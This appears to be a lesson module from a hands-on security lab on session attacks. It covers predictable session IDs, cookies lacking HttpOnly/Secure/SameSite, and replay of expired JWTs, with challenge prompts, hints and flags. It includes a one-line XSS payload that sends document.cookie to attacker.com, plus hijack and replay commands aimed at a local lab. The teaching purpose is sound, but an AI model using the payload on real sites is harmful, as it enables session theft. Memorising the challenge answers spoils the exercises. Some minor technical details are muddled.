title: Session Security: prediction, flags and replay
description: Predictable session IDs, cookies without HttpOnly/Secure/SameSite and JWTs the server never validates: four attacks against the session.

1.title: Session ID prediction
1.body:
## Sequential session IDs = a free session

A session ID must be **unpredictable** (128 bits of cryptographic randomness,
like `Sec-Fetch` or `3f8a9c2e...`). The lab generates sequential IDs:
user100, user101, user102...

```bash
# Log in twice and watch the cookie you are assigned:
curl -sv http://127.0.0.1:18100/login 2>&1 | grep Set-Cookie
# Set-Cookie: session=100; Path=/
# Set-Cookie: session=101; Path=/   ← incremental!
```

If you are 101, the next user to log in will be 102, and the
previous one was 100. An attacker can **walk the space of active
sessions** trying 100, 101, 102... until they land on someone else's session.

## Impersonating the admin

Regular users take IDs 100-109. And the admin? They registered
"before" them:

```bash
# The /login endpoint accepts an arbitrary sid and plants it as your cookie:
curl -s -c /tmp/ck.txt "http://127.0.0.1:18100/login?sid=99"
curl -s -b /tmp/ck.txt "http://127.0.0.1:18100/whoami"
# You are admin (admin). Flag: FLAG{...}
```

This is **session hijacking by prediction**: not a single memory
exploit, no injection — just numbers counting backwards.

## How to prevent it

- Generate IDs with `secrets.token_urlsafe(32)` (or the framework's
  generator: never `uuid.uuid4()` with version 1, which leaks the MAC).
- Validate on every request that the session belongs **to the
  authenticated user**, not just that it exists.
- Rotate the ID on login (this prevents session fixation: the attacker plants a
  known ID and the victim "inherits" it when authenticating).

session-security-t01-q01.prompt: Log in normally (/login) twice in a row with curl -c and compare the session IDs. By how much do they increment?
session-security-t01-q01.hint: They are sequential: 100, 101, 102... The admin is right at the round number just before them

session-security-t01-q02.prompt: Which session ID belongs to the admin account?
session-security-t01-q02.hint: Regular users are 100-109. Which consecutive ID would fall outside them, just 'before'?

session-security-t01-q03.prompt: Set your cookie to the admin's session ID (/login?sid=X) and visit /whoami. Submit the flag.

2.title: Cookie flags and expired JWT replay
2.body:
## The three missing flags

The lab's cookie is served like this:

```
Set-Cookie: session=100; Path=/
```

Compare it with a properly configured cookie:

```
Set-Cookie: session=<random>; Path=/; HttpOnly; Secure; SameSite=Lax
```

| Flag | What it prevents | What happens without it |
|---|---|---|
| `HttpOnly` | `document.cookie` from JS | An XSS steals the session with one line |
| `Secure` | Sending over plain HTTP | The cookie travels in cleartext on wifi networks |
| `SameSite` | Cross-site sending | CSRF: other sites make requests with your session |

## Theft with one line of XSS

With `HttpOnly` missing, any XSS — even a "minor" one — becomes
an account takeover:

```javascript
// Full XSS payload:
fetch('http://attacker.com/steal?c=' + document.cookie)
```

The lab simulates the attacker's server. "Steal" your own session to see
how trivial it is:

```bash
curl -s "http://127.0.0.1:18100/steal?c=100"
# "cookie received by attacker ... FLAG{cookie_stolen_no_httponly}"
```

## The JWT that never expires

JWTs carry their expiration **inside the token itself** (the `exp` claim).
That makes them stateless — and dangerous: if the server does not validate `exp`,
the token lives forever.

```bash
# 1. The server GIVES YOU an already expired JWT (look at the note):
curl -s http://127.0.0.1:18100/api-jwt | jq .
# "hint": "This JWT is expired but the server does NOT check exp"

# 2. Decode the payload (the middle part, base64url):
echo "<payload-del-medio>" | base64 -d
# {"user": "admin", "role": "admin", "exp": 1000000000}   ← year 2001

# 3. Send it back as is — the replay works:
curl -s "http://127.0.0.1:18100/api-jwt?token=<token>"
# "status": "admin" ... "note": "exp not checked!"
```

A 20-year-old admin token is still valid. In production this is
mitigated by validating `exp` **always** (libraries do it by default:
`jwt.verify()`, never a bare `jwt.decode()`) and by keeping a
revocation list in case of theft.

session-security-t02-q01.prompt: Which cookie flag would stop JavaScript from reading document.cookie (blocking XSS theft)?

session-security-t02-q02.prompt: Simulate the theft: send a valid session id to the attacker's collector /steal?c=X. Submit the flag.
session-security-t02-q02.hint: curl 'http://127.0.0.1:18100/steal?c=100' — this is how an XSS payload exfiltrates the cookie when HttpOnly is missing

session-security-t02-q03.prompt: Visit /api-jwt without a token, decode the payload of the JWT it hands you (base64). What year does it expire (exp field)?
session-security-t02-q03.hint: echo <payload> | base64 -d — the timestamp 1000000000 is September 2001

session-security-t02-q04.prompt: Replay that same expired JWT to /api-jwt?token=X. Submit the replay flag.
